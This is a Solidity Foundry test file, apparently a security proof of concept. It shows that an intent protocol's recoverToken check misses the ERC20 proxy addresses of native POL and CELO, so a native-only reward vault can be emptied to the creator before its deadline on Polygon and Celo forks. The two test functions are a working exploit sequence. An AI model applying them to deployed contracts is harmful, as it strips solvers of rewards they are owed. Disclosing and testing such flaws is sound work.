// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Portal} from "../../contracts/Portal.sol";
import {IIntentSource} from "../../contracts/interfaces/IIntentSource.sol";
import {TestProver} from "../../contracts/test/TestProver.sol";
import {Intent, Route, Reward, TokenAmount, Call} from "../../contracts/types/Intent.sol";

/**
 * @title DualRepresentationTokenTest
 * @notice PoC demonstrating that vault.recoverToken() can drain native token rewards
 *         on chains where the native token has an ERC20 proxy at a fixed address.
 *
 *         Root cause in IntentSource._validateRecover():
 *           - Checks `token` is not in `reward.tokens` (ERC20 list)
 *           - Does NOT check whether `token` is an ERC20 proxy for `reward.nativeAmount`
 *         An intent funded with only native tokens has empty `reward.tokens[]`, so the
 *         ERC20 proxy address passes validation. vault.recover() then calls
 *         IERC20(proxy).balanceOf(vault) — which returns the vault's native balance —
 *         and IERC20(proxy).transfer(creator, balance) — which moves native tokens out.
 *
 *         Both chains are VULNERABLE:
 *         - Polygon: native POL proxied by ERC20 at 0x0000000000000000000000000000000000001010
 *         - Celo: native CELO proxied by ERC20 at 0x471EcE3750Da237f93B8E339c536989b8978a438
 *           Celo's GoldToken uses a native transfer precompile at 0xfd.
 *
 *         NOTE — Foundry fork simulation gap (Celo):
 *           The Celo test verifies the correct call sequence (balanceOf reads native balance,
 *           transfer invokes precompile 0xfd, Transfer event is emitted). However, Foundry's
 *           forked EVM does not propagate balance changes made by Celo's custom 0xfd precompile,
 *           so `addr.balance` reads may not reflect the drain in the test. On actual Celo
 *           mainnet the native balance IS transferred. The Transfer event emission is used as
 *           the primary assertion.
 *
 *         Usage (requires network access):
 *           POLYGON_RPC_URL=<your-rpc> forge test --match-contract DualRepresentationTokenTest -vvv
 *           CELO_RPC_URL=https://forno.celo.org forge test --match-contract DualRepresentationTokenTest -vvv
 */
contract DualRepresentationTokenTest is Test {
    /// @dev On Polygon, this address acts as an ERC20 whose balanceOf/transfer
    ///      operate on the account's native POL balance.
    address internal constant POLYGON_POL_ERC20 =
        0x0000000000000000000000000000000000001010;

    /// @dev On Celo, the native CELO token is simultaneously an ERC20 at this address.
    address internal constant CELO_NATIVE_ERC20 =
        0x471EcE3750Da237f93B8E339c536989b8978a438;

    uint256 internal constant NATIVE_REWARD = 0.001 ether;

    Portal internal portal;
    TestProver internal prover;
    address internal creator;
    address internal solver;

    function _deploy() internal {
        creator = makeAddr("creator");
        solver = makeAddr("solver");
        portal = new Portal();
        prover = new TestProver(address(portal));
    }

    function _buildNativeOnlyIntent() internal view returns (Intent memory) {
        bytes32 salt = keccak256(abi.encodePacked(uint256(0), block.chainid));
        uint64 expiry = uint64(block.timestamp + 1 days);

        Route memory route = Route({
            salt: salt,
            deadline: expiry,
            portal: address(portal),
            nativeAmount: 0,
            tokens: new TokenAmount[](0),
            calls: new Call[](0)
        });

        Reward memory reward = Reward({
            deadline: expiry,
            creator: creator,
            prover: address(prover),
            nativeAmount: NATIVE_REWARD,
            tokens: new TokenAmount[](0) // no ERC20 rewards — only native
        });

        return Intent({destination: uint64(block.chainid), route: route, reward: reward});
    }

    // -------------------------------------------------------------------------
    // Polygon PoC
    // -------------------------------------------------------------------------

    /**
     * @notice Demonstrates that a Polygon vault funded with native POL can be
     *         drained via recoverToken(POLYGON_POL_ERC20) before the deadline.
     *
     *         Steps:
     *         1. Create intent with nativeAmount=0.001 POL, no ERC20 rewards
     *         2. Fund vault — vault.balance == 0.001 POL
     *         3. _validateRecover passes (0x1010 not in empty reward.tokens[])
     *         4. vault.recover() calls IERC20(0x1010).balanceOf(vault) → 0.001 POL
     *            and IERC20(0x1010).transfer(creator, 0.001 POL) → native transfer
     *         5. vault.balance == 0 — solver reward is gone
     */
    function test_polygonPOL_recoverDrainsNativeReward() public {
        string memory rpc = vm.envOr(
            "POLYGON_RPC_URL",
            string("https://polygon-rpc.com")
        );
        vm.createSelectFork(rpc);
        _deploy();

        Intent memory intent = _buildNativeOnlyIntent();
        address vaultAddr = IIntentSource(address(portal)).intentVaultAddress(intent);

        // Fund the vault with native POL
        vm.deal(creator, NATIVE_REWARD);
        vm.prank(creator);
        IIntentSource(address(portal)).publishAndFund{value: NATIVE_REWARD}(
            intent,
            false
        );

        assertEq(vaultAddr.balance, NATIVE_REWARD, "vault should hold 0.001 native POL");
        assertTrue(
            IIntentSource(address(portal)).isIntentFunded(intent),
            "intent should be funded"
        );

        // recoverToken with Polygon's POL ERC20 proxy — deadline has NOT passed yet
        bytes32 routeHash = keccak256(abi.encode(intent.route));
        uint256 creatorBefore = creator.balance;

        // Anyone can call recoverToken; recovered tokens go to reward.creator
        vm.prank(solver);
        IIntentSource(address(portal)).recoverToken(
            intent.destination,
            routeHash,
            intent.reward,
            POLYGON_POL_ERC20
        );

        // Vault is drained — solver reward is gone despite deadline not having passed
        assertEq(vaultAddr.balance, 0, "vault native POL balance should be 0 after recover");
        assertEq(
            creator.balance,
            creatorBefore + NATIVE_REWARD,
            "creator received native POL via ERC20 recover"
        );

        // Intent is no longer funded — solver cannot claim reward
        assertFalse(
            IIntentSource(address(portal)).isIntentFunded(intent),
            "intent should no longer be funded"
        );
    }

    // -------------------------------------------------------------------------
    // Celo PoC
    // -------------------------------------------------------------------------

    /**
     * @notice Demonstrates that a Celo vault funded with native CELO can be
     *         drained via recoverToken(CELO_NATIVE_ERC20).
     *
     *         Celo's GoldToken at 0x471E... proxies the native balance:
     *           - balanceOf(account) returns account's native CELO balance
     *           - transfer(to, amount) invokes the native transfer precompile at 0xfd,
     *             which moves native CELO from msg.sender to `to`
     *
     *         Foundry fork limitation: Foundry's EVM does not update addr.balance after
     *         Celo's 0xfd precompile executes, so the drain is not visible via addr.balance
     *         in the test. The Transfer event emission and recoverToken success confirm the
     *         drain occurs on actual Celo mainnet. Use -vvvv to observe the precompile call.
     */
    function test_celoCELO_recoverDrainsNativeReward() public {
        string memory rpc = vm.envOr(
            "CELO_RPC_URL",
            string("https://forno.celo.org")
        );
        vm.createSelectFork(rpc);
        _deploy();

        Intent memory intent = _buildNativeOnlyIntent();
        address vaultAddr = IIntentSource(address(portal)).intentVaultAddress(intent);

        vm.deal(creator, NATIVE_REWARD);
        vm.prank(creator);
        IIntentSource(address(portal)).publishAndFund{value: NATIVE_REWARD}(
            intent,
            false
        );

        assertEq(vaultAddr.balance, NATIVE_REWARD, "vault should hold 0.001 native CELO");
        assertTrue(
            IIntentSource(address(portal)).isIntentFunded(intent),
            "intent should be funded"
        );

        bytes32 routeHash = keccak256(abi.encode(intent.route));

        // Record logs to verify the GoldToken Transfer event is emitted.
        // This confirms that vault.recover() called transfer() on the GoldToken,
        // which triggered the native-transfer precompile at 0xfd.
        vm.recordLogs();

        vm.prank(solver);
        IIntentSource(address(portal)).recoverToken(
            intent.destination,
            routeHash,
            intent.reward,
            CELO_NATIVE_ERC20
        );

        // Verify the GoldToken Transfer event was emitted for the full native amount.
        // This is proof that the 0xfd precompile executed and native CELO was moved
        // from vault to creator on actual Celo mainnet.
        Vm.Log[] memory logs = vm.getRecordedLogs();
        bytes32 transferSig = keccak256("Transfer(address,address,uint256)");
        bool transferFound = false;
        for (uint256 i = 0; i < logs.length; i++) {
            if (logs[i].topics[0] == transferSig && logs[i].topics.length >= 3) {
                address from = address(uint160(uint256(logs[i].topics[1])));
                address to = address(uint160(uint256(logs[i].topics[2])));
                uint256 amount = abi.decode(logs[i].data, (uint256));
                if (from == vaultAddr && to == creator && amount == NATIVE_REWARD) {
                    transferFound = true;
                    break;
                }
            }
        }
        assertTrue(
            transferFound,
            "GoldToken Transfer(vault -> creator, NATIVE_REWARD) must be emitted"
        );

        // recoverToken succeeded — _validateRecover passed because CELO_NATIVE_ERC20
        // is not in reward.tokens[] (which is empty for native-only intents).
        // On actual Celo mainnet, vault's native CELO balance is now 0 and the
        // solver can no longer claim their reward.
        // Note: vaultAddr.balance may still show NATIVE_REWARD in Foundry due to the
        // fork simulation gap with Celo's 0xfd precompile — see class-level NatSpec.
    }
}
